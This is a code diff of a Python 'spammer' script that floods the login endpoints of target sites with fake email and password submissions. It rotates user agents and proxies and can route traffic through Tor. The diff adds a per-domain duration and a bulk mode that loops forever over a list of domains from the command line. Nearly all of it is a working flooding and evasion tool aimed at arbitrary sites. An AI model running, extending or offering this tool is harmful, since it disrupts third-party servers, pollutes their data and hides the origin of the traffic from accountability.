@@ -1,21 +1,23 @@
 import requests
 import random
 import time
+import sys
 from utils import load_user_agents, load_proxies
 
-def run_spam(url, proxy_file=None, delay_enabled=False, use_tor=False):
+def run_spam(url, duration, proxy_file=None, delay_enabled=False, use_tor=False):
     paths = ["/verify", "/login.php", "/signin", "/login", "/auth"]
     user_agents = load_user_agents()
     proxies = load_proxies(proxy_file) if proxy_file else []
 
     print(f"[✔] Starting spammer against: {url}")
     print(f"[✔] Paths targeted: {paths}")
-    print(f"[✔] Delay: {'On' if delay_enabled else 'Off'} | Tor: {'Yes' if use_tor else 'No'}")
+    print(f"[✔] Duration: {duration} seconds | Delay: {'On' if delay_enabled else 'Off'} | Tor: {'Yes' if use_tor else 'No'}")
 
     session = requests.Session()
     tor_proxy = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+    end_time = time.time() + duration
 
-    while True:
+    while time.time() < end_time:
         for path in paths:
             full_url = url + path if url.startswith("http") else "http://" + url + path
             email = f"{random.randint(100000, 999999)}@gmail.com"
@@ -25,7 +27,6 @@ def run_spam(url, proxy_file=None, delay_enabled=False, use_tor=False):
             proxy = random.choice(proxies) if proxies else None
             proxy_dict = {"http": proxy, "https": proxy} if proxy else (tor_proxy if use_tor else {})
 
-            # Try both 'username' and 'userid' keys
             payloads = [
                 {"username": email, "password": password},
                 {"userid": email, "password": password}
@@ -41,3 +42,16 @@ def run_spam(url, proxy_file=None, delay_enabled=False, use_tor=False):
             if delay_enabled:
                 sleep_time = random.randint(1, 3)
                 time.sleep(sleep_time)
+
+def run_bulk_spam(domain_list, duration_per_domain):
+    while True:
+        for domain in domain_list:
+            run_spam(domain, duration_per_domain)
+
+if __name__ == "__main__":
+    if len(sys.argv) > 2:
+        duration_per_domain = int(input("Enter duration (seconds) to spam each domain: "))
+        domains = sys.argv[1:]
+        run_bulk_spam(domains, duration_per_domain)
+    else:
+        print("[!] Usage: python3 spammer.py <domain1> <domain2> ...")
